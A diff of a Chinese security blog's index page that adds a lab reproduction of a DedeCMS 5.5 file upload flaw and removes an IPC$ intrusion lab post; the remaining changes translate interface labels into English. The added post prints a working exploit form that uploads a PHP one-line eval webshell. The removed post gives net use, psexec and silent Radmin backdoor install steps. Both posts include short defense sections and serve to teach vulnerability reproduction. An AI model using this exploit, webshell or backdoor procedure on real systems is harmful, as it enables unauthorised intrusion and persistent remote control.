@@ -37,7 +37,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -68,6 +68,69 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-dede-select-soft-post-md" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/22/dede-select-soft-post-md/" class="article-date">
+  <time datetime="2018-10-22T08:36:32.000Z" itemprop="datePublished">2018-10-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/22/dede-select-soft-post-md/">dedecms5.5文件上传漏洞复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近的从防火墙检测流量发现一大波webshell上传威胁告警，指向select_soft_post.php这个文件。查了一下发现是dedecms的一个任意文件上传漏洞，发生在5.5跟5.5final版本。</p>
+<h2 id="0x01-准备环境"><a href="#0x01-准备环境" class="headerlink" title="0x01 准备环境"></a>0x01 准备环境</h2><ul>
+<li>目前的环境<br>之前一直习惯用xampp，虽然xampp比较稳定，但不支持多版本，更适合做开发及搭建版本稳定的学习环境。做漏洞复现，我们需要PHP运行环境的各种版本，相比而言，phpstudy才是更加适合目前操作的机器。</li>
+<li>php dedecms5.5系统</li>
+<li>准备好的exp</li>
+</ul>
+<h2 id="0x02-动手搭建"><a href="#0x02-动手搭建" class="headerlink" title="0x02 动手搭建"></a>0x02 动手搭建</h2><p>下载phpstudy，解压安装到C盘根路径下，并开启，将dedecms5.5放到网站根路径</p>
+<pre><code>C:\phpStudy\PHPTutorial\WWW
+</code></pre><p>解压获取的dedecmsv55系统放到该路径下，访问install,逐步完成安全，可见如下界面</p>
+<img src="/2018/10/22/dede-select-soft-post-md/dedecms.png" alt="dedecms.png" title="">
+<p>至此，环境我们就准备好了，开始复现</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>首先分析一下漏洞原因<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(!isset($cfg_basedir))</div><div class="line">&#123;</div><div class="line">	include_once(dirname(__FILE__).&apos;/config.php&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>变量$cfg_basedir没有正确的初始化，如果设置了global_register=on，我们可以通过覆盖变量的方式，饶过身份认证和系统变量初始化文件。</p>
+<p>因此，这个漏洞的触发条件有两个，因为需要启动global_register,因此php的版本需要为5.2或者5.3，高版本的已经禁用了这个功能，这也是我们选择使用phpstudy来复现这个漏洞的原因。</p>
+<ul>
+<li>dedecms5.5版本</li>
+<li>php环境开启了global_register</li>
+</ul>
+<p>接下来我们可以通告大佬写的一个表单上传，表单form对应的链接需要修改对应站点域名，然后来上传webshell文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Dedecms v55 RCE Exploit Codz By flyh4t&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body style=&quot;FONT-SIZE: 9pt&quot;&gt;---------- Dedecms v55 RCE Exploit Codz By flyh4t---------- &lt;br /&gt;&lt;br /&gt;</div><div class="line">&lt;form action=http://localhost:8888/dedecms/include/dialog/select_soft_post.php method=&apos;POST&apos; enctype=&quot;multipart/form-data&quot; name=&apos;myform&apos;&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;activepath&apos; value=&apos;/data/cache/&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_basedir&apos; value=&apos;../../&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_imgtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_not_allowall&apos; value=&apos;txt&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_softtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_mediatype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;f&apos; value=&apos;form1.enclosure&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;job&apos; value=&apos;upload&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;newname&apos; value=&apos;fly.php&apos; /&gt;</div><div class="line">Select U Shell &lt;input type=&apos;file&apos; name=&apos;uploadfile&apos; size=&apos;25&apos; /&gt;</div><div class="line">&lt;input type=&apos;submit&apos; name=&apos;sb1&apos; value=&apos;确定&apos; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;br /&gt;It&apos;s just a exp for the bug of Dedecms V55...&lt;br /&gt;</div><div class="line">Need register_globals = on...&lt;br /&gt;Fun the game,get a webshell at /data/cache/fly.php...&lt;br /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>对应的webshell,一句话后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">eval($_POST[&quot;a&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>使用菜刀访问上传的webshell。<br></p>
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>从漏洞产生条件上来看，可以关闭global_register功能，当然其他的方法也很多，比如禁止使用select_soft_post页面 </p>
+<h2 id="0x05-更多的利用"><a href="#0x05-更多的利用" class="headerlink" title="0x05 更多的利用"></a>0x05 更多的利用</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/22/dede-select-soft-post-md/" data-id="cjnl8r4pn00048cx7oiecwhbn" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dedecms-漏洞复现/">dedecms 漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
   
     <article id="post-beginners‘python" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -143,7 +206,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/21/beginners‘python/" data-id="cjnjtk9nb0003v9x7g0d7581c" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/21/beginners‘python/" data-id="cjnl8r4qt000a8cx7gydjgo7e" class="article-share-link">Share</a>
       
       
       
@@ -184,7 +247,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/12/CodeAudit/" data-id="cjnjtk9nj0005v9x719zxmw6y" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/12/CodeAudit/" data-id="cjnl8r4ov00008cx7qsgjlyn3" class="article-share-link">Share</a>
       
       
       
@@ -225,7 +288,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/12/Web-Scanner/" data-id="cjnjtk9n30001v9x78pfz4juj" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/12/Web-Scanner/" data-id="cjnl8r4pp00058cx7opfcc2mb" class="article-share-link">Share</a>
       
       
       
@@ -283,7 +346,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/16/python-in-practice/" data-id="cjnjtk9o0000cv9x7vv689kiv" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/16/python-in-practice/" data-id="cjnl8r4rb000i8cx73j2fhu5p" class="article-share-link">Share</a>
       
       
       
@@ -324,7 +387,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/10/ml-cluster-algorithm/" data-id="cjnjtk9ny000bv9x7w80s87hr" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/10/ml-cluster-algorithm/" data-id="cjnl8r4r8000h8cx7mykbe5x0" class="article-share-link">Share</a>
       
       
       
@@ -478,7 +541,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/25/hadoop-install-intro/" data-id="cjnjtk9o4000fv9x7hmwb4tnw" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/25/hadoop-install-intro/" data-id="cjnl8r4rg000j8cx7gq1zk76d" class="article-share-link">Share</a>
       
       
       
@@ -519,7 +582,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/22/spider-intro/" data-id="cjnjtk9o2000dv9x7gauaze1m" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/22/spider-intro/" data-id="cjnl8r4rk000l8cx71nl2r6t4" class="article-share-link">Share</a>
       
       
       
@@ -650,7 +713,7 @@ isinstance([], Iterable)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/13/Web-Test/" data-id="cjnjtk9ng0004v9x7ey7feu1s" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/13/Web-Test/" data-id="cjnl8r4p700028cx7bw60tn2z" class="article-share-link">Share</a>
       
       
       
@@ -794,7 +857,7 @@ timer.start()
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/getcoin/" data-id="cjnjtk9o7000gv9x71if2yr4o" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/07/getcoin/" data-id="cjnl8r4qn00098cx76xlhxvqd" class="article-share-link">Share</a>
       
       
       
@@ -808,80 +871,10 @@ timer.start()
 
 
   
-    <article id="post-IPC-EXP" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/07/IPC-EXP/" class="article-date">
-  <time datetime="2018-03-07T06:57:39.000Z" itemprop="datePublished">2018-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/07/IPC-EXP/">小白入门之IPC实验</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <h1 id="0x00-漏洞说明"><a href="#0x00-漏洞说明" class="headerlink" title="0x00 漏洞说明"></a>0x00 漏洞说明</h1><p>IPC$ (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行数据交换，从而实现对远程计算机的访问。IPC$是NT/2000及之后OS的一项新功能。一些别有用心者可以利用黑客工具软件对主机进行IPC$漏洞探测。如果用户设置的口令较弱而被破解，那么通过建立IPC＄连接的以下命令，攻击者就可以轻易地进入到系统中进行任意操作。</p>
-<h1 id="0x01-工具准备"><a href="#0x01-工具准备" class="headerlink" title="0x01 工具准备"></a>0x01 工具准备</h1><p>操作系统：</p>
-<p>攻击机器 任意windows系统 本次实验中我所使用的是win10 专业版</p>
-<p>目标靶机 windows xp 或者 windows server 2003 可以虚拟机，因为最近在玩webug，就直接使用windows server 2003了</p>
-<p>实验工具 链接：<a href="http://pan.baidu.com/s/1nuFbekh" target="_blank" rel="external">http://pan.baidu.com/s/1nuFbekh</a> 密码：lw0n</p>
-<h1 id="0x02-实验过程"><a href="#0x02-实验过程" class="headerlink" title="0x02 实验过程"></a>0x02 实验过程</h1><h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><p>使用net share命令观察目标靶机IPC$漏洞是否存在</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-2cb00ff3bba63bf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><p>首先ping一下目标靶机，观察网络连通性。</p>
-<p>然后执行 net use <a href="\ip">\ip</a> “密码” /user:”登陆账户”命令建立IPC$连接</p>
-<p>使用 net use z: <a href="\ip\c$">\ip\c$</a> 命令，将目标靶机的C盘映射到本地z盘</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-559986c4c9b9c446.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-<p>完成上述命令后将会在计算机看到网络位置出现了一个新的盘符，实际上目前就可以通过可视化桌面像在本地操作一样拷贝文件。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-cd765e3151f30b13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-<h3 id="步骤2-5"><a href="#步骤2-5" class="headerlink" title="步骤2.5"></a>步骤2.5</h3><p>如果你想酷一点的话，我们来试试copy指令。将要使用的远程控制软件拷贝到目标靶机的C盘中。执行过程如下：<br><img src="http://upload-images.jianshu.io/upload_images/2303859-449260e298db82de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-<h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><p>上述命令执行完毕后，我们使用psexec启动目标靶机上的一个shell。</p>
-<p>将路径切换到psexec程序所在路径下 ，执行如下命令：</p>
-<p>psexec.exe <a href="\ip">\ip</a> –u 用户名 –p 密码 cmd.exe</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-979a5aa04d492827.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
-<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><p>接下来我们来安装控制后门并启动运行。</p>
-<p>使用如下指令实现r_server的静默安装：r_server /install /silence</p>
-<p>执行两次net start  r_server来启动后门服务，出现如下所示，即启动成功。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-724e1622dc8a558d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><p>接下来，我们使用radmin来连接目标靶机上运行的r_server</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-2b828dab7f42f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
-<p>添加完成后，我们将可以像在本地一样操作目标靶机</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-df0d43dad232b610.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br><img src="http://upload-images.jianshu.io/upload_images/2303859-eefd851f834b6cda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
-<h1 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h1><h2 id="1-关闭IPC-默认共享"><a href="#1-关闭IPC-默认共享" class="headerlink" title="1 关闭IPC$默认共享"></a>1 关闭IPC$默认共享</h2><p><img src="http://upload-images.jianshu.io/upload_images/2303859-2e827045ba913855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"></p>
-<h2 id="2-关闭IPC-默认共享的依赖服务server"><a href="#2-关闭IPC-默认共享的依赖服务server" class="headerlink" title="2 关闭IPC$默认共享的依赖服务server"></a>2 关闭IPC$默认共享的依赖服务server</h2><p>控制面板/管理工具/服务 找到server 关闭</p>
-<h2 id="3-屏蔽139，445端口"><a href="#3-屏蔽139，445端口" class="headerlink" title="3 屏蔽139，445端口"></a>3 屏蔽139，445端口</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/IPC-EXP/" data-id="cjnjtk9mv0000v9x75h8odhyk" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页&raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next&raquo;</a>
   </nav>
 </section>
            
@@ -917,18 +910,22 @@ timer.start()
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title tagcloud">标签云</h3>
+    <h3 class="widget-title tagcloud">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/python-技术/" style="font-size: 14px;">python 技术</a> <a href="/tags/安全/" style="font-size: 14px;">安全</a> <a href="/tags/工具/" style="font-size: 14px;">工具</a>
+      <a href="/tags/dedecms-漏洞复现/" style="font-size: 14px;">dedecms 漏洞复现</a> <a href="/tags/python-技术/" style="font-size: 14px;">python 技术</a> <a href="/tags/安全/" style="font-size: 14px;">安全</a> <a href="/tags/工具/" style="font-size: 14px;">工具</a>
     </div>
   </div>
 
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title recent-posts">最新文章</h3>
+    <h3 class="widget-title recent-posts">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/10/22/dede-select-soft-post-md/">dedecms5.5文件上传漏洞复现</a>
+          </li>
         
           <li>
             <a href="/2018/05/21/beginners‘python/">python之解放生产力</a>
@@ -946,10 +943,6 @@ timer.start()
             <a href="/2018/04/16/python-in-practice/">关于python的一点实践</a>
           </li>
         
-          <li>
-            <a href="/2018/04/10/ml-cluster-algorithm/">机器学习之聚类入门</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -957,9 +950,9 @@ timer.start()
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title archive">归档</h3>
+    <h3 class="widget-title archive">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -999,10 +992,10 @@ timer.start()
   <div class="outer">
     <div id="footer-left">
       &copy; 2014 - 2018 Fire Xun&nbsp;|&nbsp;
-      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
+      Theme by <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
     </div>
      <div id="footer-right">
-      联系方式&nbsp;|&nbsp;xundidi@gmail.com
+      Contact&nbsp;|&nbsp;xundidi@gmail.com
     </div>
   </div>
 </footer>
